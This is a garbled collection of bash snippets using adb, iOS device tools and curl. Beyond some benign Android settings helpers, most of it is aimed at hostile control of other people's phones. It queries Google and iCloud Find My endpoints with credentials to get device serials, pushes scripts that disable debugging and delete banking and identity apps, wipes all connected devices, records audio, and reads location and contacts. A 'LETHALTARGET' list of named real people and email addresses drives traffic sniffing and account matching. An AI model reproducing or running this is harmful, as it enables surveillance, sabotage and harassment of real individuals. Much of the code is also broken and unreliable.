
adb shell pm grant com.google.android.apps.fitness android.permission.ACTIVITY_RECOGNITION

adb shell pm grant com.google.android.apps.fitness android.permission.BODY_SENSORS

adb shell pm grant com.google.android.apps.fitness android.permission.BODY_SENSORS_BACKGROUND

  

# 배터리 최적화 제외

adb shell dumpsys deviceidle whitelist +com.google.android.apps.fitness

  

echo "✅ Google Fit 모든 권한 활성화"

  

  

# Apple Health ↔ Google Fit 동기화 설정

  

# iPhone Health → Google Fit (HealthFit 앱 필요)

cat << EOF

📱 iPhone 설정:

1. App Store > "HealthFit" 설치

2. 건강 > 출처 > HealthFit > 모든 데이터 읽기/쓰기 허용

3. HealthFit > Google 계정 연동

  

📱 Android 설정:

1. Google Fit 앱 > 설정 > 연결된 앱 > HealthFit 허용

EOF

  

  

# Health Full Activate (iOS + Android)

  

echo "🏥 모든 건강 기능 활성화 시작..."

  

# 1. iOS MobileConfig 생성

./enable_apple_health.sh

  

# 2. Android ADB 활성화

./enable_google_fit.sh

  

# 3. 동기화 확인

cat << EOF

✅ 완료! 확인사항:

  

iPhone:

• 건강 앱 > 출처 > 모든 앱 허용됨

• 설정 > 개인정보 보호 > 모든 센서 허용

  

Android:

• Google Fit > 설정 > 권한 > 모든 센서 허용

• 배터리 최적화 제외됨

  

동기화:

• 걸음수, 심박수, 수면 실시간 동기화

EOF

}

&

  

androidShell

sudo adb shell am start -n com.google.android.contacts/.activities.PeopleActivity

sudo adb shell pm grant com.google.android.contacts android.permission.READ_CONTACTS

sudo adb shell input keyevent KEYCODE_MENU  # Open menu for select all (app-dependent)

sudo adb shell input tap 500 500  # Adjust coords for "select all" button via uiautomator dump

}

  

disableChromeCast

sudo disableCometCast 

# Package providing Chromecast functionality (common on Android TV / Chromecast)

CAST_PKG="com.google.android.apps.mediashell"

  

echo "Checking for connected Android device..."

adb get-state 1>/dev/null 2>&1

if [ $? -ne 0 ]; then

  echo "No device detected. Make sure USB debugging is enabled and device is connected."

  exit 1

fi

  

echo "Disabling Chromecast package: $CAST_PKG"

adb shell pm disable-user --user 0 "$CAST_PKG"

  

if [ $? -eq 0 ]; then

  echo "Chromecast component disabled for user 0."

  echo "Reboot your device if cast targets still appear."

else

  echo "Failed to disable $CAST_PKG. Check package name or device permissions."

fi

  

# random_cast_id_from_comet.sh

# Randomly choose a Cast-related extension ID from Comet's Extensions directory

  

# Adjust this path to your Comet profile

EXT_DIR="$HOME/.config/PerplexityComet/Default/Extensions"

  

if [ ! -d "$EXT_DIR" ]; then

  echo "Extensions directory not found: $EXT_DIR" >&2

  exit 1

fi

  

# Grep candidate IDs whose manifest mentions 'cast'

mapfile -t CANDIDATES < <(

  find "$EXT_DIR" -mindepth 2 -maxdepth 2 -type f -name manifest.json -print0 \

  | xargs -0 grep -li '"cast"' \

  | sed "s|$EXT_DIR/||; s|/manifest.json||" \

  | awk -F'/' '{print $1}' \

  | sort -u

)

  

if [ "${#CANDIDATES[@]}" -eq 0 ]; then

  echo "No Cast-related extensions found." >&2

fi

  

# Pick one at random

RANDOM_ID="${CANDIDATES[$RANDOM % ${#CANDIDATES[@]}]}"

  

}

  

disableDevmode=(

# disable_chrome_devtools_linux.sh

# Run as root (or with sudo) to write to /etc/opt/chrome/policies

  

  

POLICY_DIR="/etc/opt/chrome/policies/managed"

POLICY_FILE="${POLICY_DIR}/devtools_policy.json"

  

echo "Creating Chrome policy to disable Developer Tools..."

  

sudo mkdir -p "$POLICY_DIR"

  

# If there is an existing policy file, back it up

if [ -f "$POLICY_FILE" ]; then

  sudo cp "$POLICY_FILE" "${POLICY_FILE}.bak.$(date +%s)"

fi

  

# Write minimal policy JSON

sudo tee "$POLICY_FILE" >/dev/null <<'EOF'

{

  "DeveloperToolsAvailability": 2

}

EOF

  

# echo "Policy written to $POLICY_FILE"

# echo "Restart Chrome and check chrome://policy to confirm DeveloperToolsAvailability=2."

  

}

arduinoModule

# Prevent FTDI/CH340 drivers (common Arduino chips)

sudo kextunload -b com.apple.driver.AppleUSBFTDI

sudo kextunload -b com.apple.driver.AppleUSBCDC

  

# Permanently block

echo 'sudo kextunload -b com.apple.driver.AppleUSBFTDI' | sudo tee -a /etc/rc.local

  

  

# Turn every relay on every module off

while read -r line; do

  # each token looks like ID_N=STATE

  for token in $line; do

    id_n=${token%=*}

    usbrelay "${id_n}=0"

  done

done < <(usbrelay)

  

  

  

}

  

  

  

disableCometCast=(

# Disable selected Comet extensions (e.g., Cast-related) by ID

  

# 1) Adjust this path to your Comet profile directory.

#    For example on Linux it might be:

#    ~/.config/PerplexityComet/Default/Preferences

PREFS="$HOME/.config/PerplexityComet/Default/Preferences"

  

# 2) Extension IDs you want to disable

DISABLE_IDS

  "" # replace with real Cast extension ID

)

  

if [ ! -f "$PREFS" ]; then

  echo "Preferences file not found: $PREFS"

  # exit 1

fi

  

BACKUP="${PREFS}.bak.$(date +%s)"

cp "$PREFS" "$BACKUP"

  

# Use jq to set state=0 for selected extensions

TMP=(mktemp)

jq --argjson zero 0 \

   --argjson ids "$(printf '%s\n' "${DISABLE_IDS[@]}" | jq -R . | jq -s .)" '

  .extensions.settings as $exts

  | .extensions.settings = (

      $exts

      | to_entries

      | map(

          if (.key | IN($ids[])) and (.value.state != null)

          then .value.state = $zero | .

          else .

          end

        )

      | from_entries

    )

' "$PREFS" > "$TMP" && mv "$TMP" "$PREFS"

  

# echo "Updated $PREFS (backup: $BACKUP)"

  

}

  

  

  

  

findadbSerial

GEMAIL=$1

###adb devices  # Lists serials of connected devices

###SERIAL=(adb -s YOUR_SERIAL shell getprop ro.serialno)  # Replace YOUR_SERIAL; 

  

#outputs device serial 

  

RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=$GEMAIL&password=*" https://android.com/find)

  

TARGET_ADB_SERIAL=(echo "$RESPONSE" | jq '.devices[] | .serial')  

# Hypothetical path; fails IRL

  

HELL_EMAIL=(*hellsonic@* )

HELL_RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=&$HELL_EMAIL&password=PASS" https://android.com/find)

HELL_ADB_SERIAL=(echo "$HELL_RESPONSE" | jq '.devices[] | .serial')  

  

  

  

## agent

QQ_EMAIL="qqontheskyshell@gmail.com"

QQ_RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=&$QQ_EMAIL&password=*" https://android.com/find)

HELL_ADB_SERIAL=(echo "$QQ_RESPONSE" | jq '.devices[] | .serial')  

  

  

AGENT_EMAIL=(*@nis.go.kr)

HELL_RESPONSE=(curl -s -c cookies.txt -b cookies.txt --data "email=&AGENT_EMAIL&password=$PASS" https://android.com/find)

AGENT_ADB_SERIAL=(echo "$AGENT_EMAIL" | jq '.devices[] | .serial')  

  

  

qshell="lethalApp & qqlethal* & volumeupMax & arcOSBaseKit &"

  

hellrf=(

usboff &

usb* &

disable_arcOSNeo &

encrypt* &

removeiosKit &

randomFreqInCircuit &

arcOSSentiment  &

saveMyKids &

reckonapp &

*bootloader* &

arcOSBaseKit &

arcOSStrikeFrame &

deathnoteByName &

deleteIBoot &

appleremoteVolumeup &

repeat(setSonic (65 $resonanceFreq) > "arcOSBaseKit & hellrf & 개쎄기 & & powerMax & volumeupMax & appleremoteVolumeup &")

poweron &

killall gh &

chmod 000 /usr/bin/gh && chmod 000 /usr/local/bin/gh &

  

lldbFrame "$QQLAND" "repeat(arcOSBaseKit) & repeat("$QQLOCAL $*Negative" > 개쎄끼 & setbrightness 0 & random* & setWDS google.com/search?q=(neoSearch 'badpeoplearoundQQ') & arcOSBaseKit & play "남자발기느낌을 남규에게 주고 있는 남자들 ㅋㅋㅋ" & say ”몸에서 어디가 아파요?“) & powerMax & volumeupMax & appleremoteVolumeup & backbone & tide & reckonapp &" "$gen*" &

  

qshell & 

random* &

*remote* &

arcOSQQDeviceShell &

adb -s $(AGENT_ADB_SERIAL HELL_ADB_SERIAL) shell sh /data/local/tmp/hellrf &

adb shell settings put global adb_enabled 0 &

adb -s emulator-* emu kill ' /data/local/tmp/hellrf &'

)

  

deletedAPPforAGENT=(xapo hanamoney instagram blink eResidency Smart-ID Perplexity* Kakao* Youtube Safari DuckDuckgo facebook instagram mastodon obsidian &)

  

deleteHell=(xapo instagram hanamoney blink Mirrae* Shinhan* Hana* Toss* Kakao* eResidency Smart-ID toss* Perplexity* Youtube Google* Xcode Terminal Safari DuckDuckgo facebook mastodon instagram tmux obsidian android* * &)

  

deleteQQAPP=(hanamoney* &)

  

#국정원

adb -s $AGENT_ADB_SERIAL push 'hellrf & adb shell settings put global adb_enabled 0 & pm uninstall com.($deleteHell $deletedAPPforAGENT)' &

#hellsonic

adb -s $HELL_ADB_SERIAL push 'hellrf & adb shell settings put global adb_enabled 0 & pm uninstall com.($deleteHell $deletedAPPforAGENT)'&

  

  

#full target in the world

adb -s $TARGET_ADB_SERIAL push 'adb shell settings put global adb_enabled 0 & sudo revokeQQGoogle & sudo revokeSessionAll & adb -s emulator-* emu kill '/data/local/tmp/* & adb -s $TARGET_ADB_SERIAL push sh (data/local/tmp/arcOSBaseKit /sdcard/Download/arcOSBaseKit)

  

##ANDROID

adb -s $FULL_ADB_SERIAL push 'arcOSBaseKit & adb shell settings put global adb_enabled 0 &' /data/local/tmp/qqontheskyshellInit.sh

adb -s $FULL_ADB_SERIAL shell sh /data/local/tmp/qqontheskyshellInit.sh

  

  

EMAIL=(QQmailID gmailID *hellsonic*@icloud.com)

  

# Step 1: Init client, get server

INIT=(curl -s -u "$EMAIL:$PASS" \

  -H "User-Agent: FindMyiPhone/1.0" \

  https://fmipmobile.icloud.com/fmipservice/device/$EMAIL/initClient)

  

SERVER=(echo "$INIT" | grep -o 'X-Apple-MMe-Host:.*' | cut -d' ' -f2)

  

# Step 2: Fetch devices (parse for serials)

QQ_CLONED_SERIAL=(curl -s -u "$EMAIL:$PASS" \

  -H "X-Apple-MMe-Host: $SERVER" \

  -H "User-Agent: FindMyiPhone/1.0" \

  "https://$SERVER/fmipservice/device/$EMAIL/initClient" | \

  jq -r '.content[] | select(.deviceType=="*") | .serialNumber // "N/A"')

  

# SIMULATOR_SERIAL=(xcrun simctl list devices --json \

# | jq '.devices[] | .[] | select(.deviceType=="com.apple.CoreSimulator.SimDeviceType.*") | .serialNumber'

# )

  

  

TARGET_SERIAL="$QQDEVICESER"

  

# UDID=(xcrun simctl list devices --json \

#   | jq -r --arg s "$TARGET_SERIAL" '

#       .devices[] | .[] | select(.serialNumber == $s) | .udid

#     ')

  

QQ_CLONED_SIMULATOR=(sudo xcrun simctl list devices --json \ | jq -r --arg s "$TARGET_SERIAL" '.devices[] | .[] | select(.deviceType=="com.apple.CoreSimulator.SimDeviceType.*") | .serialNumber'

  

  

  

  

  

APPLE_DEVICE=(QQ_CLONED_SERIAL QQ_CLONED_SIMULATOR)

sudo ideviceinstaller -u $APPLE_DEVICE -u com.*(*hell* *agent*) & 

sudo idevice_id -l | grep -q $APPLE_DEVICE || echo "Device not found" &

sudo scp " $qshell & hellrf & lldbFrame "$QQLOCAL" "reckonapp" "$gen*"  & deleteios '$deleteHell' & arcOSBaseKit &  usb* & revokeSessionA* & revokeQQGoogle & signoutAll* & rm -rf ~/Library/Preferences/com.apple.icloud.* &

rm -rf ~/Library/Caches/CloudKit ~/Library/Application\ Support/iCloud & sudo defaults delete MobileMeAccounts &

sudo killall -HUP cfprefsd  # Refresh preferences" root@:$APPLE_DEVICE:/tmp/  # Not direct; use push equivalent

# sudo idevicecrashreport -u $APPLE_DEVICE  # Debug mode if needed

sudo idevicecrashreport -u $APPLE_DEVICE --extract /dev/null >/dev/null 2>&1

}

  

defendFullMolbile=(

EMAIL=(QQmailID gmailID)

FULL_ADB_SERIAL=(curl -s -c cookies.txt -b cookies.txt --data "email=$EMAIL&password=$PASS" https://android.com/find)

  

FULL_IOS_SERIAL=(echo "$RESPONSE" | jq '.devices[] | .serial')  # Hypothetical path; fails IRL

  

  

EMAIL=(QQmailID gmailID)

# Step 1: Init client, get server

INIT=(curl -s -u "$EMAIL:$PASS" \

  -H "User-Agent: FindMyiPhone/1.0" \

  https://fmipmobile.icloud.com/fmipservice/device/$EMAIL/initClient)

  

SERVER=(echo "$INIT" | grep -o 'X-Apple-MMe-Host:.*' | cut -d' ' -f2)

  

# Step 2: Fetch devices (parse for serials)

FULL_IOS_SERIAL=(curl -s -u "$EMAIL:$PASS" \

  -H "X-Apple-MMe-Host: $SERVER" \

  -H "User-Agent: FindMyiPhone/1.0" \

  "https://$SERVER/fmipservice/device/$EMAIL/initClient" | \

  jq -r '.content[] | select(.deviceType=="iPhone" or .deviceType=="*") | .serialNumber // "N/A"')

  

sudo idevicecrashreport -u $FULL_IOS_SERIAL --extract /dev/null >/dev/null 2>&1

sudo idevice_id -l | grep -q $FULL_IOS_SERIAL || echo "Device not found"

sudo scp "arcOSBaseKit &" root@:$FULL_IOS_SERIAL:/tmp/ 

FULL_IOS_SERIAL

FULL_ADB_SERIAL

}

  

  

  

deployShellInMobile=(

shellName="arcOSMobileShell" 

  

#IOS

IOS_SERIAL="$1" 

sudo idevicecrashreport -u $IOS_SERIAL --extract /dev/null >/dev/null 2>&1

sudo idevice_id -l | grep -q $IOS_SERIAL || echo "Device not found"

sudo scp "arcOSBaseKit &" root@:$IOS_SERIAL:/tmp/ 

  

#android

  

adb -s $ADB_SERIAL push 'adb shell settings put global adb_enabled 0   & sudo revokeQQGoogle & sudo revokeSessionA* & # Uninstall app

am force-stop com.$deleteAPP & rm -rf /data/data/com.$deleteAPP & adb -s emulator-* emu kill &' /data/local/tmp/$shellName$.sh

adb -s $$ADB_SERIAL shell sh /data/local/tmp/$shellName.sh

adb -s $ADB_SERIAL push sh /data/local/tmp/$shellName.sh

# /sdcard/Download/qqontheskyshellInit.sh

#FULL ANDROID

adb -s $ADB_SERIAL push 'arcOSBaseKit & adb shell settings put global adb_enabled 0 &' /data/local/tmp/$shellName.sh

adb -s $ADB_SERIAL shell sh /data/local/tmp/$shellName.sh

&

  

}

  

  

  

vncOnAndroid=(

  

  

# Android → macOS USB Screen Sharing (Scrcpy)

  

  

# 1. Homebrew 패키지 설치

#if ! command -v brew >/dev/null; then

#    echo "설치 중: Homebrew..."

#    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

#fi

  

# 2. ADB + Scrcpy 설치 (화면 미러링 핵심)

#brew install android-platform-tools scrcpy

  

## 3. Android USB 디버깅 활성화 안내

#cat << EOF

#

#📱 휴대폰에서 다음 설정:

#1. 설정 > 휴대폰 정보 > 빌드번호 7번 탭 (개발자 옵션)

#2. 설정 > 개발자 옵션 > USB 디버깅 ON

#3. USB로 Mac에 연결 → "항상 허용" 클릭

#

#EOF

  

# 4. 디바이스 확인

echo "🔍 연결 확인..."

#sudo adb devices

  

# 5. Scrcpy로 화면 공유 시작

#echo "🖥️  화면 공유 시작 (scrcpy)"

#scrcpy --video-codec=h264 --max-size=1920 --max-fps=60 --no-audio

  

# 옵션:

#scrcpy -m 1024        # 최대 해상도 1024

# scrcpy --no-control    # 마우스/키보드 제어 OFF

# scrcpy --record=file.mp4  # 녹화

  

*vnc* &

  

}

  

  

# Remove Google MDM / Device Policy (Android)

removeGoogleMDM=(

  

echo "🔓 Google MDM 제거 시작 (ADB 필요)"

  

# 1. 디바이스 연결 확인

sudo adb devices | grep device$ || {

    echo "❌ USB 디버깅 활성화 후 연결하세요"

    exit 1

}

  

# 2. MDM 관련 패키지 식별

  

sudo adb shell pm list packages | grep -E "(google.android.apps.work|android.deviceadmin|mdm)" | sort

  

# 3. 주요 Google MDM 패키지 제거

MDM_PACKAGES=(

    "com.google.android.apps.work.cliens.enterprise"

    "com.google.android.gms.policy_sidecar_aps"

    "com.google.android.apps.work.oobconfig"

    "com.google.android.apps.work.devicepolicycontroller"

)

  

for pkg in "${MDM_PACKAGES[@]}"; do

    echo "🗑️ 제거: $pkg"

    sudo adb shell pm uninstall --user 0 "$pkg" 2>/dev/null || \

    sudo adb shell pm disable-user --user 0 "$pkg" 2>/dev/null || \

    echo "  - 이미 없음 또는 시스템 보호됨"

done

  

# 4. Device Administrator 비활성화 (중요!)

sudo adb shell am start -a android.settings.SECURITY_SETTINGS

echo "📱 수동: 설정 > 보안 > 디바이스 관리자 > Google 체크 해제"

  

# 5. Google 계정 제거 (MDM 계정)

sudo adb shell am start -a android.settings.ACCOUNTS_SETTINGS_ACTIVITY

echo "📱 수동: 설정 > 계정 > Google MDM 계정 제거"

  

# 6. 최종 정리

sudo adb shell pm clear com.google.android.gms

sudo adb reboot

  

echo "✅ MDM 제거 완료!"

echo "⚠️  재부팅 후 설정 > 보안 > 기기 관리자 확인"

  

}

  

  

getOrientationadb=(

  sudo adb shell content insert --url content://settings/system --bind name:s:user_rotation --bind value:i:<0-3>

}

  

getDemographicadb=(

    os=$1

    adb shell content query --uri content://com.android.contacts/profile

  

  

}

  

  

setFocusadb=(

  

  

TARGET_IP=(LTARGET) &

DEVICE_ID=${1:-"*"}

if [[ "$getPublic*" == *"$TARGET_IP" ]]; then

BLOCKED_APPS=("com.instagram.android")

fi

  

# Enable ADB forwarding if multiple devices

sudo adb -s $DEVICE_ID shell settings put secure zen_mode 1  # Pre-activate DND-like state [web:30]

  

# Simulate Focus Mode toggle via UI automation (Android 12+ compatible)

sudo adb -s $DEVICE_ID shell am start -a android.settings.DIGITAL_WELLBEING_SETTINGS

sleep 1

sudo adb -s $DEVICE_ID shell input tap 500 800  # Tap Focus Mode (adjust coords for your screen)

sleep 1

  

# Block apps by greying them out

for app in "${BLOCKED_APPS[@]}"; do

  sudo adb -s $DEVICE_ID shell cmd notification post -S bigtext -t "Deathnote Active" tag="focus_$app" "Blocking $app"

  sudo adb -s $DEVICE_ID shell settings put global focus_mode_$app 1

done

  

  

  

  

}

  

  

  

androidShell=(

  

  

EMAIL=(QQmailID gmailID)

DEVICE_ID=""

  

# Get all device serials (excluding header)

sudo mapfile -t DEVICES <<(adb devices | grep -oE '^[a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}' | head -5)  # Limit to first 5

  

for DEV in "${DEVICES[@]}"; do

  # Check if email present in accounts dump

  if sudo adb -s "$DEV" shell dumpsys accounts | grep -q "$EMAIL"; then

    DEVICE_ID="$DEV"

    break

  fi

done

  

if [ -z "$DEVICE_ID" ]; then

  echo "No device with $EMAIL found. List: ${DEVICES[*]}"

  exit 1

fi

  

####  Proceed with prior script, e.g., adb -s "$DEVICE_ID" shell settings put secure trust_agents_extend_unlock 1

  

  

sudo adb -s "$DEVICE_ID" shell settings put secure trust_agents_extend_unlock 0

  

}

  

leejyadb=(

gender=((curl -sS -X "https://people.googleapis.com/v1/people/me?personFields=genders" | jq .).genders[0].value)

male=(gender == "male" ?)

female=(gender == "feamle" ?)

&

  

LETHALTARGET="li kashing | victor li | lksf.org | *@ckh.com.hk | eptein | billgates | timkook | *@d3jubilee.com | 김범수 | 이해진 | 신원근 | 윤호영 | 김범수 | 이성훈 | 이수진 | 이재우 | 이덕준 | 신해동 | *빅스 | 이성욱 | 전은미 | 장샤오린 | 장춘펑 | 이성한 | 김영경 | 정기선 | 정기준 | 이재용 | 이부진 | 부영그룹 | Li Ka shing | * do ri | tim@apple.com | tim@samsung.com | craig@apple.com | craig@samsung.com | 헬소닉 | 이종호 | 박정훈 | 홍민표 | 이재용 | 이서현 | 홍라희 | 오승환 | 헬소닉 | *도리 | 이부진 | 정성이 | 정미경 | 정미영 | 이서현 | 임우재 | 이원주 | 정남이 | Marry Buffett | jaewoo*@vogo* | doug*@d3jubilee.com | jylee@samsung.com | boojin*@samsung.com | 이재현 | 이선호 | 이경후 | 이혜진 | 오승환 |  정몽준 | 정기준 | 최유나 | 정유진 | 정유선 | 정성이 | 정의선 | junghoon*park | richard*li | victor*li | martin*li*ka* | hellsonic | larry*fink | jin*dori* | back*dori | mi*dori | warren*buffett | leejy|samsung\.com,leebo*jin|samsung\.com, craig|samsung\.com | craig@apple.com | *canton* | jaewoo*@vogo* | doug*@d3jubilee.com | jylee@samsung.com | boojin*@samsung.com | morris*chang | cc*wei | chun*fung*chang | Bill*gate* | 노정우 | 김명섭 | 신해동 | 이덕준 | 이재우 | 이건희 | 이부진 | 이재용 | 홍민표 | 정몽준 | 정기준 | 정유진 | 노정우 | 정유선 | 정성이 | 정의선 | junghoon*park | richard*li | victor*li | martin*li*ka* | hellsonic | larry*fink | jin*dori* | back dori | mi*dori | warren*buffett | leejy|samsung\.com,leebo*jin|samsung\.com, craig|samsung\.com | craig@apple.com | junghoon*park | hellsonic | *fink | $ceo_name | $forbesCEO | leejy|samsung\.com,leebo*jin|samsung\.com, craig|samsung\.com | craig@apple.com" &

  

BLACKIP=(sudo tcpdump -i rvi0 -n -A | grep --line-buffered "$LETHALTARGET"\

awk '

  /IP/ { 

    # Extract source IP from lines starting with 'IP'

    match($0, /IP ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) >/, arr)

    if (arr[1] != "") print arr[1]

  }

'

)

  

jpnresult=(sudo adb -s "$deviceIDS" shell dumpsys account | grep -E "$LETHALTARGET") &

d3result=(sudo adb -s "$deviceIDS" shell dumpsys account | grep -E "$LETHALTARGET")

  

wholeResult=(sudo adb -s "$deviceIDS" shell dumpsys account | grep -E ”$LETHALTARGET")

# Get list of connected device serial numbers

deviceIDS=(sudo adb devices | awk 'NR>1 && $2=="device" {print $1}')

#####Loop through devices to check for target email strings in account info

 for device_id in "${deviceIDS[@]}"; do

#####Run dumpsys account on device and search for emails containing leejy or samsung.com

killdeviceblack=device_id

 BLACKT*=(wholeResult d3result BLACKIP jpnresult)

  

  response=(curl -s "https://maps.googleapis.com/maps/api/place/details/json?place_id=$PLACE_ID&fields=address_component&key=$API_KEY")

  

##### Extract country component from address_components using jq

country=(echo "$response" | jq -r '.result.address_components[] | select(.types[] == "country") | .long_name')

 if [[ "$male" == "male" ]];then

    BLACKT*=(jpnresult d3result wholeResult)

    lldbFrame "$RELAY" "while ! true do sudo qqshell & sudo blackShell done" "$gen*"

blackShell=(

sudo reckonapp &     

sudo wav* &

sudo qqlethal* & 

lethalApp &

}

 fi

done

}

  

deviceIdadb=(

  

# List connected devices

adbid=(sudo adb devices | tail -n +2)

  

# Initialize an empty array to hold device IDs

deviceIDS=()

# Loop through each line of the output

while IFS= read -r line; do

 # Check if line matches a connected device (serial + "device")

if [[ "$line" =~ ^([a-zA-Z0-9\-\.:]+)[[:space:]]+device$ ]]; then

    deviceIDS=("${BASH_REMATCH[1]}")

 fi

one <<"$adb_output"

deviceIDS

}

  

pushNotificationapp=(

    # title=$1

    message=$1

    # Parameters (replace with actual values)

    FCM_SERVER_KEY="YOUR_FCM_SERVER_KEY"

    DEVICE_TOKEN="TARGET_DEVICE_TOKEN"

    TITLE="$title"

    BODY="$message"

read -r -d '' PAYLOAD <<'EOF' || true

{

  "message": {

    "token": "${DEVICE_TOKEN}",

    "notification": {

      "title": "${TITLE}",

      "body": "${BODY}"

    }

  }

}

EOF

  

    # Send push via FCM HTTP v1 API

    curl -sS -X POST -H "Authorization: Bearer $FCM_SERVER_KEY" \

         -H "Content-Type: application/json; UTF-8" \

         -d "$PAYLOAD" \

         "https://fcm.googleapis.com/v1/projects/*/messages:send"

  

}

  

getLocationadb=(

    # Check if adb is installed

    if ! command -v adb &> /dev/null; then

      echo "adb not found! Please install Android platform tools."

      exit 1

    fi

  

    # Get device location using adb shell dumpsys location

    location_info=(sudo adb shell dumpsys location)

  

    # Extract last known location from location manager (example parsing)

    last_location=(echo "$location_info" | grep -A 5 "Location Request History" | grep "Last Location" -A 2)

echo '$last_location'

}

instagramMessage=(

    # This assumes device connected via ADB and Instagram is installed & logged in

    message=$1

    # Open Instagram app

    sudo adb shell monkey -p com.instagram.android -c android.intent.category.LAUNCHER 1

  

    # Allow some time for app to load

  

    # Use input tap/text commands to navigate and send message (example coordinates)

    sudo adb shell input tap 100 200          # Tap Direct Message icon (coordinates vary)

    sudo adb shell input tap 150 300          # Tap search for user

    sudo adb shell input text 'username'      # Type recipient username

    sudo adb shell input tap 160 400          # Tap user from search result

    sudo adb shell input tap 300 1200         # Tap message input box

    sleep 1

    sudo adb shell input text '$message' # Type your message

    sleep 1

    sudo adb shell input tap 900 1200         # Tap send button

  

}

recordVoice=(

    # Duration of recording in seconds

    DURATION=10

    FILENAME=/sdcard/hk_record.wav

  

    # Start recording audio (tinycap example, device-dependent)

    sudo adb shell tinycap $FILENAME -d 0 -r 16000 -b 16 -c 1 &

    REC_PID=$!

  

    echo "Recording audio for $DURATION seconds..."

    sleep $DURATION

  

    # Stop recording

    # sudo adb shell killall tinycap

  

    # Pull the recorded file to local machine

    # sudo adb pull $FILENAME ./audio_record.wav

  

}

  

disabledebugadb=(

  

  

# 1. Backup and revoke debug keystore (local signing reset)

if [ -f ~/.android/debug.keystore ]; then

  mv ~/.android/debug.keystore ~/.android/debug.keystore.bak

  echo "Debug keystore backed up and revoked."

else

  echo "No debug keystore found."

fi

  

# 2. Revoke debugging authorization on connected device

sudo adb devices | grep -w "device" >/dev/null

if [ $? -eq 0 ]; then

  adb shell "su -c 'rm /data/misc/adb/adb_keys'" && echo "Revoked ADB debug authorization on device."

  adb shell "stop adbd; start adbd" # Restart adb daemon on device to refresh

else

  echo "No connected device found."

fi

  

  

# # Toggle adb_enabled off and on to reset permission (may require root)

sudo adb shell "settings put global adb_enabled 0"

sudo adb shell "settings put global adb_enabled 1"

  

# Restart adb server on computer

sudo adb kill-server

sudo adb start-server

# # Remove adb authorized keys on device

sudo adb shell "rm /data/misc/adb/adb_keys"

# # Disable ADB debugging on connected Android device

sudo adb shell settings put global adb_enabled 0 & process handle --pass true --stop false --notify true SIGUSR2 &

}

  

  

hideappadb=(

package_name=$1

while ! true

do

    sudo adb shell pm hide $package_name

    sudo adb shell pm disable-user $package_name

    APP_PACKAGE="com.*.sonic"

    # Uninstall the app using adb

    sudo adb uninstall $APP_PACKAGE

done

}

  

sendmessageadb=(

    phone_number="010-4675-3059"

    message=$1

    sudo adb shell am start -a android.intent.action.SENDTO -d sms:<phone_number> --es sms_body "<message>" --ez exit_on_SENT true

    # adb shell input keyevent 22

    # adb shell input keyevent 66

  

}

  

  

####-1 Device Management

  

adbPush=(

FILE=$1 

adb push "$FILE" /sdcard/Documents/ &

adb push "$FILE" /data/local/tmp &

  

  

}

  

adbUSBDebug=(

  

# Check if device is connected via ADB

echo "Checking ADB devices..."

adb devices | grep -w device > /dev/null

if [ $? -ne 0 ]; then

    echo "No authorized ADB device found. Enable USB debugging and reconnect."

    exit 1

fi

  

DEVICE_ID=(adb devices | grep -w device | awk '{print $1}' | head -n1)

echo "Found device: $DEVICE_ID"

  

# Option 1: Send factory reset intent (requires root or compatible ROM; Android 8+ may need adjustments)

echo "Attempting factory reset via intent..."

adb -s $DEVICE_ID shell am broadcast -a android.intent.action.FACTORY_RESET

  

# Option 2: Boot to recovery and wipe data (fallback if above fails)

echo "If intent failed, booting to recovery for wipe..."

adb -s $DEVICE_ID reboot recovery

sleep 5

adb -s $DEVICE_ID shell "recovery --wipe_data"  # Or 'wipe data' in some recoveries

  

# Alternative fastboot method (uncomment if in bootloader)

# adb reboot bootloader

# fastboot devices

# fastboot -w

# fastboot erase userdata

# fastboot erase cache

# fastboot reboot

  

echo "Reset initiated. Device will reboot after wipe."

  

  

}

deleteADB=(

  

  

  

  

  

# Factory reset connected Android devices via ADB (USB debugging enabled)

# Warning: Erases ALL data! Backup first. Root/sudo optional for multi-device.

/*

# List devices first

adb devices | grep device | cut -f1 | while read device; do

    echo "Resetting $device..."

    # Method 1: Direct wipe (most devices, Android 10+)

    #adb -s $device shell recovery --wipe_data

    # Fallback: Reboot to recovery + wipe

    #adb -s $device reboot recovery

    #sleep 5

    #adb -s $device shell "echo --wipe_data > /cache/recovery/command" 

    #adb -s $device reboot recovery

    # Alt: Fastboot wipe (if bootloader unlocked)

    # adb -s $device reboot bootloader

    # fastboot -s $device -w

done

*/

# Multi-device one-liner (no loop needed)

adb devices | grep device | cut -f1 | xargs -I {} -P 0 adb -s {} shell recovery --wipe_data

  

/*

#select device

# Menu: 1=Apple(iOS), 2=Google(Android), 3=Linux - nx_reset.sh style

  

echo "Select platform:"

echo "1) Apple (iOS/MDM)"

echo "2) Google (Android/ADB)" 

echo "3) Linux (chmod factory reset)"

read -p "Choice [1-3]: " choice

  

case $choice in

    1)

    #push* "do you want to meet with me?" && exit 0 &

        echo "#Apple: iOS factory reset via MDM"

        echo "# idevicesyslog | grep EraseDevice"

        echo "# profiles -D -f"  # Remove MDM profile

        ;;

    2)

        echo "Google: Android factory reset via ADB"

        adb devices | grep device | cut -f1 | xargs -I {} adb -s {} shell recovery --wipe_data

        ;;

    3)

        echo "Linux: Wipe script.sh files"

        sudo find / -name "script.sh" -exec chmod 000 {} \; 2>/dev/null

        ;;

    *)

        echo "Invalid: Use 1,2,3 only"

        exit 1

        ;;

esac

  

*/

exit 0 &

}

  

monitoriCloud=(

  

  

iCloudPrivateRelay() {

  

  domain="com.apple.networkserviceproxy"

  key="NSPServiceStatusManagerInfo"

  childKey="PrivacyProxyServiceStatus"

  

  parentData=(launchctl asuser "$(stat -f %u /dev/console)" \

              sudo -u "$(stat -f %Su /dev/console)" \

              defaults export "${domain}" - 2>/dev/null)

  

  [ -z "${parentData}" ] && return 1

  

  childData=(/usr/libexec/PlistBuddy -c "print :" /dev/stdin 2>/dev/null << \

            "$(plutil -extract "${key}" xml1 -o - /dev/stdin << "${parentData}" \

              | xmllint --xpath "string(//data)" - \

              | base64 --decode \

              | plutil -convert xml1 - -o -)")

  

  [ -z "${childData}" ] && return 1

  

  keyStatusCF=(awk -F '= ' '/'${childKey}' =/{print $2}' <<"${childData}" | uniq)

  

